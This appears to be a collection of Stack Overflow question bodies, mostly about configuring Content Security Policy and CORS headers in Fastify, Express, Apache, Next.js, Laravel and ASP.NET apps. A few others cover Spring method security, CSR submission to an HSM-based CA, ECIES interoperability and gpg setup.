<p>My stack is based on <a href=""https://fastify.dev/"" rel=""nofollow noreferrer"">Fastify</a> and I use <a href=""https://helmetjs.github.io/"" rel=""nofollow noreferrer"">Helmet</a> to manage CSP authorizations , more precisely an encapsulated version for Fastify: <a href=""https://github.com/fastify/fastify-helmet"" rel=""nofollow noreferrer"">@fastify/helmet</a>. Basically under the hood it's the same thing, however I'll clarify just in case...</p>
<p>Here is my configuration under Fastify:</p>
<pre class=""lang-js prettyprint-override""><code>import helmet from '@fastify/helmet'

app.register(helmet, {
  contentSecurityPolicy: {
    directives: {
      defaultSrc: [&quot;'self' 'unsafe-inline'&quot;],
      imgSrc: [
        &quot;'self' data: *.openstreetmap.org&quot;,
        &quot;'self' data: *.openstreetmap.fr&quot;,
        &quot;'self' data: *.ign.fr&quot;,
        &quot;'self' data: *.youtube.com&quot;,
        &quot;'self' data: *.ytimg.com&quot;, // YouTube, certaines miniatures du player et notamment l'image par défaut.
      ],
      frameSrc: [&quot;'self' data: *.youtube.com&quot;],
    },
  },
})
</code></pre>
<p>It is certain that the problem does not come from elsewhere than this code (eg: server configuration) because when I delete the Helmet code here I regain use of my YouTube players. Conversely, permissions for OpenStreetMap and IGN are no problem.</p>
<p>What drives me crazy is that when I was prototyping in Express.js I had no problem playing my YouTube videos:</p>
<pre class=""lang-js prettyprint-override""><code>const helmet = require('helmet')

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: [&quot;'self' 'unsafe-inline'&quot;],
      imgSrc: [
        &quot;'self' data: *.openstreetmap.org&quot;,
        &quot;'self' data: *.openstreetmap.fr&quot;,
        &quot;'self' data: *.ign.fr&quot;,
        &quot;'self' data: *.youtube.com&quot;,
        &quot;'self' data: *.ytimg.com&quot;, // YouTube, certaines miniatures du player et notamment l'image par défaut.
      ],
      frameSrc: [&quot;'self' data: *.youtube.com&quot;],
    },
  })
)
</code></pre>
<p>I should point out that the two projects, Fastify and Express, are compared in localhost and that they both use the same version of Node.js (v21.6.1).</p>
<p>If anyone of you has an idea, unless the problem is right there in front of me... in any case I'm interested.</p>
<p>EDIT n°1:</p>
<p><code>pn ls</code> for Fastify:</p>
<pre><code>dependencies:
@fastify/cookie 9.3.1        @fastify/helmet 11.1.1       @fastify/static 6.12.0       argon2 0.31.2                ip 1.1.8                     
@fastify/flash 5.1.0         @fastify/postgres 5.2.2      @fastify/view 8.2.0          fastify 4.25.2               pg 8.11.3                    
@fastify/formbody 7.4.0      @fastify/session 10.7.0      @js-temporal/polyfill 0.4.4  fastify-plugin 4.5.1         pug 3.0.2                    

devDependencies:
postcss 8.4.33
postcss-advanced-variables 3.0.1
postcss-calc 9.0.1
postcss-cli 11.0.0
postcss-import 16.0.0
postcss-minify 1.1.0
postcss-preset-env 9.3.0
svg-symbol-sprite 1.4.1
svgo 3.2.0
terser 5.26.0
</code></pre>
<p><code>pn ls</code> for Express:</p>
<pre><code>dependencies:
argon2 0.28.2             date-easter 0.2.5         express-session 1.17.1    http-errors 1.8.0         morgan 1.10.0             pug 3.0.2                 url 0.11.0                
compression 1.7.4         debug 4.2.0               express-urlrewrite 1.4.0  i18n-iso-countries 6.0.0  passport 0.4.1            serve-favicon 2.5.0       
connect-flash 0.1.1       dotenv 16.0.1             express-useragent 1.0.13  ip 1.1.5                  passport-local 1.0.0      suncalc 1.8.0             
cookie-parser 1.4.4       express 4.18.2            helmet 4.5.0              luxon 2.0.2               pg-promise 10.11.0        uglify-es 3.3.9           

devDependencies:
autoprefixer-stylus 1.0.0
browser-sync 2.26.14
eslint 7.25.0
jest 27.2.0
nodemon 2.0.22
postcss 8.2.15
stylus 0.59.0
</code></pre>
<p>EDIT n°2:</p>
<p>I just did a <code>curl -I &lt;url&gt;</code> on each of my two projects. Although the Fastify plugin relies on Helmet, it does not return the same CSP rules as for Express.</p>
<p>Fastify:</p>
<pre><code>HTTP/1.1 200 OK
Content-Security-Policy: default-src 'self' 'unsafe-inline';img-src 'self' data: *.openstreetmap.org 'self' data: *.openstreetmap.fr 'self' data: *.ign.fr 'self' data: *.youtube.com 'self' data: *.ytimg.com;frame-src 'self' data: *.youtube.com
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
Origin-Agent-Cluster: ?1
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=15552000; includeSubDomains
X-Content-Type-Options: nosniff
X-DNS-Prefetch-Control: off
X-Download-Options: noopen
X-Frame-Options: SAMEORIGIN
X-Permitted-Cross-Domain-Policies: none
X-XSS-Protection: 0
// ...
</code></pre>
<p>Express:</p>
<pre><code>HTTP/1.1 200 OK
x-powered-by: Express
content-security-policy: default-src 'self' 'unsafe-inline';img-src 'self' data: *.openstreetmap.org 'self' data: *.openstreetmap.fr 'self' data: *.ign.fr 'self' data: *.youtube.com 'self' data: *.ytimg.com;frame-src 'self' data: *.youtube.com
// ...
</code></pre>
<p>I'm going to try to proceed by elimination, no longer using Helmet, but by doing something like this:</p>
<pre class=""lang-js prettyprint-override""><code>app.addHook('onRequest', (req, res, done) =&gt; {
  // prettier-ignore
  res.headers({
    'Content-Security-Policy': &quot;default-src 'self';base-uri 'self';font-src 'self' https: data:;form-action 'self';frame-ancestors 'self';img-src 'self' data:;object-src 'none';script-src 'self';script-src-attr 'none';style-src 'self' https: 'unsafe-inline';upgrade-insecure-requests&quot;,
    'Cross-Origin-Opener-Policy': 'same-origin',
    'Cross-Origin-Resource-Policy': 'same-origin',
    'Origin-Agent-Cluster': '?1',
    'Referrer-Policy': 'no-referrer',
    'Strict-Transport-Security': 'max-age=15552000; includeSubDomains',
    'X-Content-Type-Options': 'nosniff',
    'X-DNS-Prefetch-Control': 'off',
    'X-Download-Options': 'noopen',
    'X-Frame-Options': 'SAMEORIGIN',
    'X-Permitted-Cross-Domain-Policies': 'none',
    'X-XSS-Protection': '0',
  }) // Set referrer policy to same-origin
  done()
})
</code></pre>
<p>Edit n°3:</p>
<p>Well, already, there were repetitions in my code, at least this problem will have allowed me to understand what I am configuring:</p>
<pre class=""lang-js prettyprint-override""><code>app.register(helmet, {
  contentSecurityPolicy: {
    //useDefaults: false,
    directives: {
      defaultSrc: [&quot;'self' https:&quot;],
      imgSrc: [
        &quot;'self'&quot;,
        'data:',
        '*.openstreetmap.org',
        '*.openstreetmap.fr',
        '*.ign.fr',
        '*.youtube.com',
        '*.ytimg.com', // YouTube, certaines miniatures du player et notamment l'image par défaut.
      ],
      frameSrc: [&quot;*.youtube.com&quot;],
    },
  },
  //crossOriginEmbedderPolicy: false,
  //crossOriginOpenerPolicy: true
})
</code></pre>
<p>I managed to get YouTube videos to work, but I had to add <code>https:</code> to <code>defaut-src</code>, which doesn't seem great to me, and above all I don't understand why it works on Express without this parameter.</p>
<p>The question therefore remains open...</p>
"
"<p>I have a Microfrontend app implemented using Webpack Module Federation. So I have a Host app and a Child app (both built using ReactJS)</p>
<p>I have a reference to the child app from the host as below configuration;</p>
<pre><code>remotes: {
    mychildMfe: `mychildMfe@${mychildUrl}`,
  },
</code></pre>
<p>When I hit my Host app URL at <code>https://myhost-app.apps.myorg.net</code>, I am getting a CORS error as below;</p>
<blockquote>
<p>Access to font at 'https://mychild-app.apps.myorg.net/static/media/open-sans-latin-400-normal.xxxxxxxxx.woff2' from origin 'https://myhost-app.apps.myorg.net' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource.</p>
</blockquote>
<p>I have already tried enabling CORS and allowing origin <code>^https?://.*\.myorg\.net$</code></p>
<p>But still getting the same error.</p>
"
"<p>I'm trying to resolve these warnings</p>
<p><code>script-src</code> directive is missing. This can allow the execution of unsafe scripts. and
Missing <code>object-src</code> allows the injection of plugins that execute unsafe scripts. Consider setting <code>object-src</code> to <code>'none'</code> if you can.</p>
<p>in the &quot;Trust and Safety Section&quot; of the Google Page Speed report. I've used multiple browsers including the current Edge, Chrome, Firefox (also Developer Edition), Chrome. What's interesting, though not the main question: why do I get different results in Google Page Speed using different Brorwsers? Concrete example: Running Page Speed in Opera throws the following errors in &quot;Best Practices&quot;</p>
<p>&quot;Deprecated APIs will eventually be removed from the browser. Learn more about deprecated APIs.&quot; and
&quot;The unload event does not fire reliably and listening for it can prevent browser optimizations like the Back-Forward Cache. Use pagehide or visibilitychange events instead. Learn more about unload event listeners&quot;</p>
<p>and the score in that section drops to 74. Running the same website using Chrome, no such errors appear and the score in &quot;Best Practices&quot; is 100.</p>
<p>These are my current rules (inspired by <a href=""https://releasecandidate.dev/posts/2021/content-security-policy-for-google-adsense/"" rel=""nofollow noreferrer"">CSP for AdSense</a></p>
<pre><code>&lt;IfModule mod_headers.c&gt;
Header set Content-Security-Policy &quot;upgrade-insecure-requests&quot;
Header set Content-Security-Policy &quot;object-src 'none';&quot;
Header set Content-Security-Policy &quot;block-all-mixed-content&quot;
Header set Content-Security-Policy &quot;frame-ancestors 'self';&quot;
Header set Content-Security-Policy &quot;img-src 'self' https://jigsaw.w3.org/css-validator/images/vcss https://*.google-analytics.com https://*.analytics.google.com https://*.googletagmanager.com https://*.g.doubleclick.net https://*.google.com https://*.google.com pagead2.googlesyndication.com;&quot;
Header set Content-Security-Policy &quot;frame-src 'self' 'unsafe-inline' googleads.g.doubleclick.net tpc.googlesyndication.com;&quot;
Header set Content-Security-Policy &quot;script-src 'self' 'unsafe-inline' pagead2.googlesyndication.com partner.googleadservices.com tpc.googlesyndication.com www.googletagservices.com adservice.google.com adservice.google.ad adservice.google.ae adservice.google.com.af adservice.google.com.ag adservice.google.com.ai adservice.google.al adservice.google.am adservice.google.co.ao adservice.google.com.ar adservice.google.as adservice.google.at adservice.google.com.au adservice.google.az adservice.google.ba adservice.google.com.bd adservice.google.be adservice.google.bf adservice.google.bg adservice.google.com.bh adservice.google.bi adservice.google.bj adservice.google.com.bn adservice.google.com.bo adservice.google.com.br adservice.google.bs adservice.google.bt adservice.google.co.bw adservice.google.by adservice.google.com.bz adservice.google.ca adservice.google.cd adservice.google.cf adservice.google.cg adservice.google.ch adservice.google.ci adservice.google.co.ck adservice.google.cl adservice.google.cm adservice.google.cn adservice.google.com.co adservice.google.co.cr adservice.google.com.cu adservice.google.cv adservice.google.com.cy adservice.google.cz adservice.google.de adservice.google.dj adservice.google.dk adservice.google.dm adservice.google.com.do adservice.google.dz adservice.google.com.ec adservice.google.ee adservice.google.com.eg adservice.google.es adservice.google.com.et adservice.google.fi adservice.google.com.fj adservice.google.fm adservice.google.fr adservice.google.ga adservice.google.ge adservice.google.gg adservice.google.com.gh adservice.google.com.gi adservice.google.gl adservice.google.gm adservice.google.gr adservice.google.com.gt adservice.google.gy adservice.google.com.hk adservice.google.hn adservice.google.hr adservice.google.ht adservice.google.hu adservice.google.co.id adservice.google.ie adservice.google.co.il adservice.google.im adservice.google.co.in adservice.google.iq adservice.google.is adservice.google.it adservice.google.je adservice.google.com.jm adservice.google.jo adservice.google.co.jp adservice.google.co.ke adservice.google.com.kh adservice.google.ki adservice.google.kg adservice.google.co.kr adservice.google.com.kw adservice.google.kz adservice.google.la adservice.google.com.lb adservice.google.li adservice.google.lk adservice.google.co.ls adservice.google.lt adservice.google.lu adservice.google.lv adservice.google.com.ly adservice.google.co.ma adservice.google.md adservice.google.me adservice.google.mg adservice.google.mk adservice.google.ml adservice.google.com.mm adservice.google.mn adservice.google.ms adservice.google.com.mt adservice.google.mu adservice.google.mv adservice.google.mw adservice.google.com.mx adservice.google.com.my adservice.google.co.mz adservice.google.com.na adservice.google.com.ng adservice.google.com.ni adservice.google.ne adservice.google.nl adservice.google.no adservice.google.com.np adservice.google.nr adservice.google.nu adservice.google.co.nz adservice.google.com.om adservice.google.com.pa adservice.google.com.pe adservice.google.com.pg adservice.google.com.ph adservice.google.com.pk adservice.google.pl adservice.google.pn adservice.google.com.pr adservice.google.ps adservice.google.pt adservice.google.com.py adservice.google.com.qa adservice.google.ro adservice.google.ru adservice.google.rw adservice.google.com.sa adservice.google.com.sb adservice.google.sc adservice.google.se adservice.google.com.sg adservice.google.sh adservice.google.si adservice.google.sk adservice.google.com.sl adservice.google.sn adservice.google.so adservice.google.sm adservice.google.sr adservice.google.st adservice.google.com.sv adservice.google.td adservice.google.tg adservice.google.co.th adservice.google.com.tj adservice.google.tl adservice.google.tm adservice.google.tn adservice.google.to adservice.google.com.tr adservice.google.tt adservice.google.com.tw adservice.google.co.tz adservice.google.com.ua adservice.google.co.ug adservice.google.co.uk adservice.google.com.uy adservice.google.co.uz adservice.google.com.vc adservice.google.co.ve adservice.google.vg adservice.google.co.vi adservice.google.com.vn adservice.google.vu adservice.google.ws adservice.google.rs adservice.google.co.za adservice.google.co.zm adservice.google.co.zw adservice.google.cat;&quot;
Header set Content-Security-Policy &quot;connect-src https://pagead2.googlesyndication.com/getconfig/ 'self' https://*.google-analytics.com https://*.analytics.google.com https://*.googletagmanager.com https://*.g.doubleclick.net https://*.google.com https://*.google.com;&quot;
Header set Strict-Transport-Security &quot;max-age=31536000; includeSubDomains&quot;
Header set X-Xss-Protection &quot;1; mode=block&quot;
Header set X-Frame-Options &quot;SAMEORIGIN&quot;
Header set X-Content-Type-Options &quot;nosniff&quot;
Header set Referrer-Policy &quot;strict-origin-when-cross-origin&quot;
Header set Permissions-Policy &quot;geolocation=self&quot;
Header always edit Set-Cookie ^(.*)$ &quot;$1; HttpOnly; Secure; SameSite=None&quot;
&lt;/IfModule&gt;
</code></pre>
<p>The mod_headers section does work generally since when I set the script-src or img-src to 'none', the website stops working correctly, stops loading scripts and images and errors are shown in the Browser console.</p>
<p>How do I get Google Page Speed to recognice my script-src and object-src rules?</p>
<ul>
<li>Tried running Google Page Speed using different browsers -&gt; CSP warning unchanged</li>
<li>Tried Header set Content-Security-Policy &quot;object-src 'none'&quot; instead of Header set Content-Security-Policy &quot;object-src 'none';&quot; -&gt; CSP warning unchanged</li>
</ul>
"
"<p>I'm trying to implement a strict Content Security Policy in my app and although I don't use any inline styles I was getting a ton of errors for <code>unsafe-inline</code> styles.</p>
<p>Inspecting my page on my browser developer's tools in the Elements tab, I noticed that all images had inline styles applied so I realized that Next's <code>&lt;Image /&gt;</code> component renders out an <code>&lt;img style=&quot;color:transparent;background-size:cover;...&quot; /&gt;</code> with inline styles applied.</p>
<p>Does anyone know if there is an efficient solution for this/how <code>&lt;Image /&gt;</code> can be used with strict CSP?</p>
<p>Thanks in advance!</p>
"
"<p>I have a <strong>Nuxt.js</strong> application. I try to fetch data from an api everytime the user change the page. but i get confronted by a Cors problem:</p>
<blockquote>
<p>Access to fetch at 'https://api.jikan.moe/v4/top/anime/?page=2' from origin 'http://localhost:3000' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource. If an opaque response serves your needs, set the request's mode to 'no-cors' to fetch the resource with CORS disabled.</p>
</blockquote>
<pre class=""lang-js prettyprint-override""><code>const fetchData = async (page) =&gt; {
    const { data: recommendations } = await useFetch(
      `https://api.jikan.moe/v4/top/anime/?page=${page}`
    );
    return recommendations;
  };

  const page = ref(1);
  const recommendations = ref([]);

  watch(page, async (newPage) =&gt; {
    recommendations.value = await fetchData(newPage);
  });
</code></pre>
"
"<p>When I tried adding roles, I am unable to view any roles in Role assignment section. How can I view them?</p>
<p><a href=""https://i.stack.imgur.com/j0rTO.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/j0rTO.png"" alt=""enter image description here"" /></a></p>
"
"<p>I'm using CSP; I made the changes for the policy on the server side, and then I'm using the <strong>nonce</strong> on the client side. It works for everything. I just have an issue with <strong>UserCentries</strong>. I still get the below error:</p>
<blockquote>
<p>uc-block.bundle.js:1 Refused to apply inline style because it violates the following Content Security Policy directive: &quot;style-src 'self' 'nonce-cdbb69b0170fa85cd202dd223dc7de80' <a href=""https://fonts.googleapis.com"" rel=""nofollow noreferrer"">https://fonts.googleapis.com</a> https://*.iadvize.com&quot;. Either the 'unsafe-inline' keyword, a hash ('sha256-gxqnKDxRDSXGSNnZ1pqKxuJyI+PHG6Tvsbz7z9B4+ZI='), or a nonce ('nonce-...') is required to enable inline execution.</p>
</blockquote>
<p>And when I click on the error line in Chrome, it goes to the codes inside this file:
<a href=""https://i.stack.imgur.com/aScwS.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/aScwS.png"" alt=""enter image description here"" /></a></p>
<p>It seems the issue is because of the <strong>style</strong> tag here, which doesn't have the <strong>nonce</strong> attribute.</p>
<p>I have a <code>CspMiddleware</code> and I handle the policy inside it. Here is the code for <code>Policy</code>:</p>
<pre><code>public override async Task Invoke(IOwinContext context)
{
    var randomNonce = Shared.Extensions.Extensions.GenerateNonce();
    var isUmbracoRequest = context.Request.Uri.AbsolutePath.StartsWith(&quot;/umbraco&quot;);
    var policy = new[] {
        $&quot;script-src 'self' {(isUmbracoRequest ? &quot;'unsafe-inline'&quot; : $&quot;'nonce-{randomNonce}' 'strict-dynamic'&quot;)} {string.Join(&quot; &quot;, this._config?.ExternalUrls)}; &quot; +
        $&quot;style-src 'self' {(isUmbracoRequest ? &quot;'unsafe-inline'&quot; : $&quot;'nonce-{randomNonce}'&quot;)} {string.Join(&quot; &quot;, this._config?.ExternalCssUrls)}; &quot; +
        $&quot;object-src 'self'; &quot; +
        $&quot;report-uri /umbraco/api/helper/CreateCSPReport&quot;
    };

    if (!context.Response.Headers.ContainsKey(&quot;Content-Security-Policy&quot;)) context.Response.Headers.Add(&quot;Content-Security-Policy&quot;, policy);
    if (!context.Response.Headers.ContainsKey(&quot;X-Content-Security-Policy&quot;)) context.Response.Headers.Add(&quot;X-Content-Security-Policy&quot;, policy);
    if (!context.Response.Headers.ContainsKey(&quot;X-Webkit-CSP&quot;)) context.Response.Headers.Add(&quot;X-Webkit-CSP&quot;, policy);
    if (!isUmbracoRequest) context.Response.Headers.Add(&quot;X-Nonce&quot;, new[] { randomNonce });

    await Next.Invoke(context);
}
</code></pre>
<p>And on the razor page, I get the <code>nonce</code> and then set it for the <code>UserCentries</code> script:</p>
<pre><code>@{
    var xNonce = HttpContext.Current.Response.Headers.GetValues(&quot;X-Nonce&quot;)?.First();
}

&lt;script type=&quot;application/javascript&quot; src=&quot;https://privacy-proxy.usercentrics.eu/latest/uc-block.bundle.js&quot; nonce=&quot;@xNonce&quot;&gt;&lt;/script&gt;
</code></pre>
<p>When I inspect in the browser, I can see the <code>nonce</code> that has been added to this script, but still, I have the above error in the console.
<a href=""https://i.stack.imgur.com/8zbLm.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/8zbLm.png"" alt=""enter image description here"" /></a></p>
<p>And here is how the CSP looks like in the http header:
<a href=""https://i.stack.imgur.com/uDgOY.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/uDgOY.png"" alt=""enter image description here"" /></a></p>
<p>How can I handle the <code>nonce</code> for this specific script (<strong>uc-block.bundle.js</strong>)?</p>
<p>Thank you.</p>
"
"<p>Spring boot 3.2.2 + Webflux Security</p>
<p>I tried to build custom @PreAuthorize via ReactiveMethodSecurity.</p>
<p>This code check user's authorization about &quot;space&quot;</p>
<pre><code>@Component(value = &quot;SpaceAccess&quot;)
@RequiredArgsConstructor
@Slf4j
public class SpaceAccessValidation {

    public final Mono&lt;Boolean&gt; readable(String spaceId){
        log.info(&quot;spaceId: {}&quot;, spaceId);
        Mono&lt;Boolean&gt; access = AuthUtils.getMemberDetailsMono()
                .map(memberDetails -&gt; memberDetails.spaces()
                        .stream()
                        .anyMatch(o -&gt; StringUtils.equals(o.id(), spaceId) &amp;&amp; o.role().readable))
                .switchIfEmpty(AuthUtils.getAccessId()
                        .flatMap(accessId -&gt; compareSpaceMemberRoleLevel(spaceId, accessId, SpaceRoleType.VIEWER))
                );
        return Mono.zip(access, spaceExist(spaceId), (a, b) -&gt; a &amp;&amp; b);
    }
}
</code></pre>
<p>AuthUtils just bring principal from ReactiveSecurityContextHolder.</p>
<p>The matter is when this method has been executed by RestController passed parameter spaceId is null.</p>
<pre><code>@RestController
@RequestMapping(&quot;search/spaces/{spaceId}&quot;)
public class SearchRestController {


    @GetMapping(&quot;memos&quot;)
    @PreAuthorize(&quot;@SpaceAccess.readable(#spaceId)&quot;)
    @ResponseStatus(HttpStatus.OK)
    public Mono&lt;PagingResultRecord&gt; findMemos(@PathVariable(name = &quot;spaceId&quot;) String spaceId){

        //call method
    }
}
</code></pre>
<p>When I call this api SpEL #spaceId keep passing null value.</p>
<p>I think #spaceId is correct expression. do you have any idea?</p>
<p>I've checked several questions from stackoverflow and SpEL expression document.
but everywhere said when I pass the parameter dynamically #variable is correct one.</p>
"
"<p>I manage an Office Add-in that helps aids in user productivity when writing emails. Part of the functionality of this plugin also includes adding content to the body of the emails. However, the source of the content is external which seems to trigger the content security policy set by Microsoft and prevents the email from being sent. Here is what the error I get when looking at DevTools console:</p>
<p><a href=""https://i.stack.imgur.com/L2Z9G.png"" rel=""nofollow noreferrer"">Error in DevTools console</a></p>
<p>However, the same add-in works as expected in the Outlook for Mac client. Additionally, despite the content (such as images) being blocked, it is still being rendered in the compose window normally.</p>
<p>I've also noticed this intermittent error when it comes to CSP which I'm unsure if it is related or not:</p>
<p><a href=""https://i.stack.imgur.com/K1AEq.png"" rel=""nofollow noreferrer"">Intermitted Error</a></p>
<p>Upon further debugging into the callstack where the CSP error is thrown, it appears to fail in event handler for the Outlook editor.</p>
<p><a href=""https://i.stack.imgur.com/E7jES.png"" rel=""nofollow noreferrer"">Outlook editor source</a></p>
<p>Has anyone run into this and if so, any tips on how to resolve it? Thanks in advance.</p>
<p>I've tried various Outlook office accounts including personal and Office 365 accounts and both experience the same issue of not being to send emails, though the exact behavior and scenarios vary a bit.</p>
<p>The error also does not appear to bubble up to the add-in code where try-catching would not be able to workaround this issue.</p>
<p>This appears to be a very recent issue since this was working fine before Feb 8.</p>
"
"<p>In my country the &quot;DIRECCIÓN NACIONAL DE FIRMA DIGITAL&quot; has a HSM to generate a public and private key to any requester. They are the CA.</p>
<p>It is possible for a requester to build a CSR file (using OpenSSL for example) on his device and submit it to this CA to be proccessed despite they are using a HSM?</p>
<p>I don't want to let them generate and sent to me my private key as they are doing rigth now! (supposedly they don't see it...supposedly...)</p>
<p>I tried to search in the documentation of one HSM (Luna HSM) how to do that, buy I didn't found anything.</p>
<p>Thanks in advance.</p>
"
"<p>I'm attempting to implement ECIES encryption in iOS Swift which has to be compatible with server python, but I'm encountering compatibility issues. I followed the instructions from an article for both Python and iOS, but when decrypting, it throws an error. Is there a library available that supports ECIES encryption compatible with both Python and Swift?</p>
<p>Repo macOS: <a href=""https://github.com/agens-no/EllipticCurveKeyPair"" rel=""nofollow noreferrer"">https://github.com/agens-no/EllipticCurveKeyPair</a></p>
<p>--------For python-----------</p>
<p>and I have tried this repository:
<a href=""https://gist.github.com/dschuetz/2ff54d738041fc888613f925a7708a06"" rel=""nofollow noreferrer"">https://gist.github.com/dschuetz/2ff54d738041fc888613f925a7708a06</a></p>
<p><a href=""https://gist.github.com/ateska/09e1c874494bba8e381ccd8d851b0df8"" rel=""nofollow noreferrer"">https://gist.github.com/ateska/09e1c874494bba8e381ccd8d851b0df8</a></p>
<p>article: <a href=""https://darthnull.org/secure-enclave-ecies/"" rel=""nofollow noreferrer"">https://darthnull.org/secure-enclave-ecies/</a></p>
"
"<p>I used the Spatie CSP package to add CSP to a website and all is good, no issues. But I discovered there is a problem with the XML sitemaps. Same with the XML RSS feed, both generate an error:</p>
<p><code>Refused to apply inline style because it violates the following Content Security Policy directive: &quot;style-src 'self' 'nonce-7k7gFQ6FMMcVLsjCqciDMUiVD7LKVEvp' fonts.googleapis.com&quot;. Either the 'unsafe-inline' keyword, a hash ('sha256-p08VBe6m5i8+qtXWjnH/AN3klt1l4uoOLsjNn8BjdQo='), or a nonce ('nonce-...') is required to enable inline execution.</code></p>
<p>I'm not sure how to fix the problem. Has anyone else ran into this problem and could shed some light on the matter? The policy is:</p>
<p><code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src 'self';style-src 'self' 'nonce-OSEVE4oRn4HgQdDkQPVf1LXfCfYfN2f5' fonts.googleapis.com;script-src 'self' 'nonce-OSEVE4oRn4HgQdDkQPVf1LXfCfYfN2f5' fonts.googleapis.com *.googletagmanager.com *.google-analytics.com;font-src 'self' fonts.gstatic.com fonts.googleapis.com data:;base-uri 'self';connect-src 'self' *.google-analytics.com;form-action 'self';media-src 'none';object-src 'none';img-src 'self' *.amazonaws.com 'unsafe-inline' *.google-analytics.com data:&quot;&gt;</code></p>
<p>All the appropriate style and javascript tags have the nonce. Must I add the nonce to the XML declaration and if so, how? Right clicking on the sitemap page reveals the XML as expected.</p>
<p>The Spatie code is:</p>
<pre><code>class Policy extends BasePolicy 
{
    /**
     * @see     https://github.com/spatie/laravel-csp
     * @see     https://freek.dev/982-using-content-security-policy-headers-in-a-laravel-app
     * @see     https://content-security-policy.com/
     * @see     https://csp-evaluator.withgoogle.com/
     * @see     https://christoph-rumpel.com/2018/03/content-security-policy-101
     * @see     https://glennsantos.com/implementing-a-content-security-policy-csp-in-laravel/
     */

    public function configure()
    {
        $this-&gt;addGenericDirectives();
        $this-&gt;addFontsDirectives();
        $this-&gt;addGoogleDirectives();
        $this-&gt;addImagesDirectives();
    }

    protected function addGenericDirectives() 
    {
        /**
         * @note    cover everything that is self hosted
         */

        $this-&gt;addDirective(Directive::DEFAULT, Keyword::SELF);
        $this-&gt;addDirective(Directive::STYLE, Keyword::SELF);
        $this-&gt;addDirective(Directive::SCRIPT, Keyword::SELF);
        $this-&gt;addDirective(Directive::FONT, Keyword::SELF);

        $this-&gt;addDirective(Directive::BASE, Keyword::SELF);
        $this-&gt;addDirective(Directive::CONNECT, Keyword::SELF);             
        $this-&gt;addDirective(Directive::FORM_ACTION, Keyword::SELF);
    
        $this-&gt;addDirective(Directive::MEDIA, Keyword::NONE);
        $this-&gt;addDirective(Directive::OBJECT, Keyword::NONE);

        $this-&gt;addNonceForDirective(Directive::SCRIPT);
        $this-&gt;addNonceForDirective(Directive::STYLE);
    }

    protected function addImagesDirectives()
    {
        /**
         * @note    add data: to the policy for bootstrap:
         * 
         *          - https://stackoverflow.com/a/70138826/17343181
         */
        
        $this-&gt;addDirective(Directive::IMG, [
            Keyword::SELF,
            '*.amazonaws.com',
            'unsafe-inline',
            '*.google-analytics.com',
            'data:',
        ]); 
    }

    protected function addFontsDirectives() 
    {
        $this-&gt;addDirective(Directive::FONT, [
            'fonts.gstatic.com',
            'fonts.googleapis.com',
            'data:'
        ]);
        $this-&gt;addDirective(Directive::SCRIPT, 'fonts.googleapis.com');
        $this-&gt;addDirective(Directive::STYLE, 'fonts.googleapis.com');
    }

    protected function addGoogleDirectives() 
    {
        $this-&gt;addDirective(Directive::SCRIPT, [
            '*.googletagmanager.com',
            '*.google-analytics.com',
        ]);

        /**
         * @note    required, for those scripts dynamically loaded
         */
        
        $this-&gt;addDirective(Directive::CONNECT, [
            '*.google-analytics.com',
        ]); 
    }

    protected function addDirectivesForYouTube()
    {
        return $this-&gt;addDirective(Directive::FRAME, '*.youtube.com');
    }

}
</code></pre>
<p>The blade file is:</p>
<pre><code>&lt;?php
echo '&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;';
?&gt;
&lt;urlset 
    xmlns=&quot;http://www.google.com/schemas/sitemap/0.84&quot; 
    xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; 
    xsi:schemaLocation=&quot;http://www.google.com/schemas/sitemap/0.84 http://www.google.com/schemas/sitemap/0.84/sitemap.xsd&quot;&gt;

    @foreach($posts as $post)
        &lt;url&gt;
            &lt;loc&gt;{{ config(&quot;app.url&quot;) }}/{{ $post-&gt;slug }}&lt;/loc&gt;
            &lt;lastmod&gt;{{ $post-&gt;created_at-&gt;tz('UTC')-&gt;toAtomString() }}&lt;/lastmod&gt;
        &lt;/url&gt;
    @endforeach
&lt;/urlset&gt; 
</code></pre>
<p>I would appreciate any help on these thanks.</p>
<p>I am not sure what changes to make to the CSP to add XML compliance, if any. Nothing in the Spatie documentation mentions anything about XML or extensible HTML either.</p>
"
"<p>How gpg.exe is configured on windows? What is configuration for setting up the encryption and decryption?</p>
<p>Not sure how it is configured. Want to see where it is configuration and how the configuration looks like, any example will help.</p>
"
"<p>I'm relatively new to web development and have been working on a project using <strong>Node.js, Express, MySQL2, and React</strong>. Recently, I integrated JSON Web Token, Cookies, and Redux into my application to make it more secure. When I ran a scan using OWASP ZAP, it flagged vulnerabilities related to HTTP headers such as &quot;Content Security Policy Header Not Set&quot; and others like X-Frame-Options. To mitigate this, I followed suggestions online and installed Helmet to manage HTTP response headers in my Express server.</p>
<p>After installing Helmet and configuring Content Security Policy directives in my <strong><code>index.js</code></strong> file, I expected to see the Content-Security-Policy header included in the response headers when inspecting network requests. Additionally, I anticipated that implementing Helmet would resolve other HTTP header-related vulnerabilities flagged by OWASP ZAP.</p>
<p>Here is my code in the <strong><code>index.js</code></strong> file of my server folder:</p>
<pre><code>import express from &quot;express&quot;;
import helmet from &quot;helmet&quot;;
import mysql2 from &quot;mysql2&quot;;
import dotenv from &quot;dotenv&quot;;
import cookieParser from &quot;cookie-parser&quot;;
import cors from &quot;cors&quot;;

import userRoutes from &quot;./routes/users.js&quot;;
import filmRoutes from &quot;./routes/films.js&quot;;
import movieRoutes from &quot;./routes/movies.js&quot;;
import reviewRoutes from &quot;./routes/reviews.js&quot;;
import authRoutes from &quot;./routes/auth.js&quot;;

const app = express();

dotenv.config();

const db = mysql2.createConnection({
  host: process.env.DB_HOST,
  user: process.env.DB_USER,
  password: process.env.DB_PASSWORD,
  database: process.env.DB_DATABASE
});

db.connect((err) =&gt; {
  if (err) {
    console.error(&quot;Error connecting to the database:&quot;, err);
    return;
